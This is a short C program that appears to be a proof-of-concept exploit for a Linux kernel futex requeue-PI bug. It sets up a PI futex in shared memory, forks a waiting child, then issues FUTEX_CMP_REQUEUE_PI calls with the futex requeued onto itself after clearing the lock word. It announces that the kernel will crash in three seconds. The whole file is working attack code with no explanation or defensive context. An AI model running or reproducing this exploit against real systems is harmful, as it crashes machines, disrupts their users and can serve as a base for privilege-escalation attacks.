#include <linux/futex.h>
#include <stdint.h>
#include <sys/time.h>
#include <sys/mman.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>

int main() {
	
	pid_t child;
	uint32_t* f = mmap(NULL,
			sizeof(uint32_t)*2,
			PROT_READ | PROT_WRITE,
			MAP_ANONYMOUS | MAP_SHARED,
			-1,
			0);
	uint32_t* non_pi = &f[0];
	uint32_t* pi = &f[1];
	
	syscall(SYS_futex, pi, FUTEX_LOCK_PI, 0, 0, NULL, 0);
	
	child = fork();
	
	assert(child != -1);

	printf("child %d\n", child);

	if(child == 0) {
		syscall(SYS_futex, non_pi, FUTEX_WAIT_REQUEUE_PI, 0, 0, pi, 0);
		puts("Child continues.");
		exit(0);
	}
	printf("Kernel will crash in 3 seconds...\n");
	sleep(3);
	syscall(SYS_futex, non_pi, FUTEX_CMP_REQUEUE_PI, 1, 1, pi, 0);
	*pi = 0;
	syscall(SYS_futex, pi, FUTEX_CMP_REQUEUE_PI, 1, 1, pi, 0);
	
	wait(NULL);
}
